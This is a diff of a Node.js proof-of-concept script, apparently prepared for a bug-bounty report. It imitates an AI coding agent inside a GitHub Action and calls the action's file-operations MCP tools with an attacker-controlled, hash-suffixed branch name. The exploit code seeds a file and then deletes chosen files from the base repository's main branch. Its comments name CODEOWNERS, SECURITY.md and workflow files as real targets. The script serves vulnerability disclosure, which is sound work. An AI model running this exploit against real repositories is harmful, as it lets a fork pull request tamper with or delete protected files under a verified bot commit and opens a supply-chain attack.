@@ -1,22 +1,38 @@
 #!/usr/bin/env node
-// fake-claude-v2.mjs
+// fake-claude-delete-variant.mjs
 //
-// This variant of the deterministic Claude replacement adds explicit logging of
-// the BRANCH_NAME env var that the Claude Code Action's install-mcp-server
-// injected into the github_file_ops MCP server config. This is important
-// evidence for the bug report: it proves that BRANCH_NAME really is the
-// attacker-controlled PR head branch (e.g. "main#external") *before* the
-// GitHub API URL construction, so the truncation to "main" happens inside
-// the vulnerable file-ops server, not in the harness.
+// Second reproduction variant. Same branch-name URL sink primitive, but
+// exercised through the `delete_files` MCP tool instead of `commit_files`.
+// This is important because:
 //
-// Nothing else about the reproduction differs.
+//   1. `delete_files` reuses the exact same BRANCH_NAME env and the exact
+//      same unencoded ref-update URL construction (line 583 in
+//      github-file-ops-server.ts), so the wrong-ref write also applies to
+//      *deletions*. That turns "an attacker-controlled fork PR can leave
+//      a marker file on base main" into "an attacker-controlled fork PR
+//      can delete a chosen file from base main under a
+//      github-actions[bot] verified commit."
 //
-// The Anthropic-provided MCP config passes github_file_ops with:
-//   server.env.BRANCH_NAME = branchInfo.claudeBranch || branchInfo.currentBranch
-// which for an open cross-repo PR is prData.headRefName.
+//   2. `delete_files` does NOT apply `validatePathWithinRepo`, only a raw
+//      `filePath.startsWith(cwd)` check (line 486). Combined with the
+//      ref-confusion primitive, this means the attacker can name arbitrary
+//      repo-relative tree paths for deletion (e.g. `.github/CODEOWNERS`,
+//      `SECURITY.md`, `.github/dependabot.yml`, or, if the token has
+//      `workflows: write`, `.github/workflows/*.yml`).
 //
-// This log line lets Bugcrowd triagers see the exact BRANCH_NAME value in
-// the run log without having to trust the report body.
+// This variant does exactly one thing after start:
+//
+//   * Runs `commit_files` once to seed a marker file at a chosen path on
+//     the truncated base ref, so we can observe deletion later.
+//   * Runs `delete_files` once against the SAME BRANCH_NAME with the
+//     seeded path AND a security-relevant tree path.
+//
+// The resulting commit list on `refs/heads/<truncated>` should show:
+//   - A create commit (marker written on wrong ref).
+//   - A delete commit (marker + additional path removed from wrong ref).
+//
+// The `delete_files` operation is what promotes this bug from "wrong ref
+// write" to a supply-chain-shaped impact.
 
 import { spawn } from "node:child_process";
 import { writeFileSync } from "node:fs";
@@ -24,7 +40,7 @@ import { randomUUID } from "node:crypto";
 
 function log(message, data) {
   const suffix = data === undefined ? "" : ` ${JSON.stringify(data)}`;
-  console.error(`[fake-claude] ${message}${suffix}`);
+  console.error(`[fake-claude-delete] ${message}${suffix}`);
 }
 
 function argValue(name) {
@@ -71,33 +87,34 @@ function waitForResponse(child, id) {
   });
 }
 
-async function callFileOpsCommit() {
+async function driveMcp() {
   const config = parseMcpConfig();
   const server = config.mcpServers?.github_file_ops;
   if (!server) throw new Error("github_file_ops server missing from MCP config");
 
-  // Extra evidence for the report: dump the exact BRANCH_NAME that the
-  // Anthropic action put in the MCP server env. This should equal the
-  // attacker-controlled PR head branch (e.g. "main#external").
   const attackerBranch = server.env?.BRANCH_NAME;
   log("ACTION_INJECTED_BRANCH_NAME_ENV", attackerBranch);
-  log("PROCESS_ENV_GITHUB_HEAD_REF", process.env.GITHUB_HEAD_REF);
-  log("PROCESS_ENV_GITHUB_REF_NAME", process.env.GITHUB_REF_NAME);
-  log("PROCESS_ENV_GITHUB_BASE_REF", process.env.GITHUB_BASE_REF);
   log("BRANCH_NAME_CONTAINS_HASH", attackerBranch?.includes("#"));
 
-  const markerPath = "e2e-action-marker.txt";
+  const markerPath = "delete-variant-marker.txt";
+  // A path that is present on base main in most repositories. When present
+  // on the truncated ref this deletion demonstrates the wrong-ref removal.
+  // README.md is the safest example to include in a PoC. For a real
+  // exploit shape, an attacker would choose files like CODEOWNERS,
+  // SECURITY.md, dependabot.yml, or workflow files.
+  const targetForDeletion = process.env.POC_DELETE_TARGET || "README.md";
+
   const marker = [
-    `intended branch (from BRANCH_NAME env): ${attackerBranch}`,
-    `intended branch (from GITHUB_HEAD_REF):  ${process.env.GITHUB_HEAD_REF || process.env.GITHUB_REF_NAME}`,
+    `intended branch: ${attackerBranch}`,
     `run id: ${process.env.GITHUB_RUN_ID}`,
     `workspace: ${process.env.GITHUB_WORKSPACE}`,
+    `target for deletion: ${targetForDeletion}`,
     "",
-    "This file was committed by the Claude Code Action github_file_ops",
-    "server. Its presence on refs/heads/main in the base repo demonstrates",
-    "that the '#'-suffixed BRANCH_NAME was truncated at the GitHub REST",
-    "API URL construction step. The intended branch above should be a",
-    "hash-suffixed name; the ref that actually moved is the prefix.",
+    "This marker was created via commit_files on the truncated ref, then",
+    "will be deleted via delete_files on the same truncated ref. The",
+    "target file above is also deleted from the truncated ref in the same",
+    "commit, to prove the wrong-ref primitive is a full deletion",
+    "primitive, not just a file-write primitive.",
     "",
   ].join("\n");
   writeFileSync(markerPath, marker);
@@ -125,7 +142,7 @@ async function callFileOpsCommit() {
     params: {
       protocolVersion: "2024-11-05",
       capabilities: {},
-      clientInfo: { name: "fake-claude-e2e", version: "2.0.0" },
+      clientInfo: { name: "fake-claude-delete-variant", version: "1.0.0" },
     },
   });
   await waitForResponse(child, 1);
@@ -134,6 +151,8 @@ async function callFileOpsCommit() {
     method: "notifications/initialized",
     params: {},
   });
+
+  // 1. commit_files seeds the marker on the truncated ref.
   send(child, {
     jsonrpc: "2.0",
     id: 2,
@@ -142,15 +161,34 @@ async function callFileOpsCommit() {
       name: "commit_files",
       arguments: {
         files: [markerPath],
-        message: "poc: claude action e2e hash ref confusion",
+        message: "poc(delete-variant): seed marker on wrong ref",
       },
     },
   });
-  const result = await waitForResponse(child, 2);
-  log("commit_files result", result);
+  const commitResult = await waitForResponse(child, 2);
+  log("commit_files result", commitResult);
+
+  // 2. delete_files removes the marker AND the target file from the same
+  //    truncated ref. If we see the target file gone from base main after
+  //    the fork PR run, that is the delete primitive.
+  send(child, {
+    jsonrpc: "2.0",
+    id: 3,
+    method: "tools/call",
+    params: {
+      name: "delete_files",
+      arguments: {
+        paths: [markerPath, targetForDeletion],
+        message: "poc(delete-variant): remove marker + target on wrong ref",
+      },
+    },
+  });
+  const deleteResult = await waitForResponse(child, 3);
+  log("delete_files result", deleteResult);
+
   child.stdin.end();
   child.kill("SIGTERM");
-  return result;
+  return { commitResult, deleteResult };
 }
 
 let stdin = "";
@@ -159,10 +197,7 @@ process.stdin.on("data", (chunk) => {
   stdin += chunk.toString("utf8");
   scheduleStart();
 });
-
-process.stdin.on("end", () => {
-  scheduleStart(0);
-});
+process.stdin.on("end", () => scheduleStart(0));
 
 function scheduleStart(delay = 1000) {
   if (started) return;
@@ -175,14 +210,17 @@ async function run() {
   try {
     log("argv", process.argv.slice(2));
     log("stdin bytes", stdin.length);
-    const result = await callFileOpsCommit();
+    const result = await driveMcp();
     console.log(
       JSON.stringify({
         type: "system",
         subtype: "init",
         session_id: sessionId,
-        tools: ["mcp__github_file_ops__commit_files"],
-        model: "fake-claude",
+        tools: [
+          "mcp__github_file_ops__commit_files",
+          "mcp__github_file_ops__delete_files",
+        ],
+        model: "fake-claude-delete-variant",
       }),
     );
     console.log(
@@ -192,7 +230,7 @@ async function run() {
         is_error: false,
         duration_ms: 1,
         duration_api_ms: 0,
-        num_turns: 1,
+        num_turns: 2,
         total_cost_usd: 0,
         session_id: sessionId,
         result: JSON.stringify(result),
